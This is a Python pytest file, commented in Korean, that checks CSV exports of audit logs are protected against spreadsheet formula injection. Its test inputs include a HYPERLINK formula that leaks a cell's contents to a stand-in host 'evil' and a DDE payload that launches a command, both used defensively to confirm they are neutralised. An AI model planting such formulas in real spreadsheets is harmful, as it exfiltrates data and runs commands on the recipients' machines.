"""CSV 내려받기(감사로그·알림 이력) 수식 주입 방지."""

from __future__ import annotations

import pytest

from app.csvexport import csv_response, safe_cell, weak_reason


@pytest.mark.parametrize(("value", "expected"), [
    ('=HYPERLINK("http://evil/?"&A2,"상세")', '\'=HYPERLINK("http://evil/?"&A2,"상세")'),  # syslog 호스트 이름으로 들어올 수 있다
    ("+1+cmd|' /C calc'!A0", "'+1+cmd|' /C calc'!A0"),
    ("-2+3", "'-2+3"),
    ("@SUM(A1)", "'@SUM(A1)"),
    ("\t=1", "'\t=1"),
    ("PC-01", "PC-01"),        # 중간의 - 는 그대로
    ("로그온 실패", "로그온 실패"),
    ("", ""),
    (42, 42),                  # 숫자는 숫자로 (엑셀 정렬)
    (-5, -5),
    (None, None),
])
def test_safe_cell(value, expected):
    assert safe_cell(value) == expected


def test_csv_response_has_bom_and_neutralized_cells():
    r = csv_response(["대상", "건수"], [["=1+1", 3]], "x.csv", headers={"X-Test": "1"})
    body = r.body.decode("utf-8")
    assert body.startswith("﻿대상,건수") and "'=1+1,3" in body
    assert r.headers["content-disposition"] == 'attachment; filename="x.csv"' and r.headers["x-test"] == "1"


@pytest.mark.parametrize(("reason", "weak"), [
    ("확인", True), ("업무", True), ("업무용", True), ("ㅁㅁㅁㅁ", True), ("....", True), ("1234", True), (" a a ", True),
    ("월간 점검", False), ("사고 조사", False), ("민원 대응 자료", False), ("audit Q3", False),
])
def test_weak_export_reason(reason, weak):
    """사유가 뜻이 없을 만큼 짧은 내려받기는 점검 보고서가 따로 보인다 (B-38) — 짧아도 뜻이 있는 문구는 통과."""
    assert weak_reason(reason) is weak

